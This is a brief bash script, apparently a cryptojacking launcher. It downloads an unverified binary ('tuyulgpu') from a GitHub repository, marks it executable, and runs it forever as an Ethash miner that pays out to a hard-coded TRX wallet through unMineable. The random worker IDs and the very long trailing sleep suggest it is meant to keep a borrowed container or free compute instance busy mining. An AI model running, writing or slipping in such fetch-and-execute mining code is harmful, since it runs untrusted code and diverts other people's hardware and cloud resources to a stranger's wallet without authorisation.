#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:TNm3k3uCQXtfYhwPZFzNq4dTCPumBSfYNp
WORKER=$(echo $(shuf -i 10-40 -n 1))
wget https://github.com/skullCANDe/hick/raw/main/tuyulgpu
chmod +x tuyulgpu
while [ 1 ]; do
./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
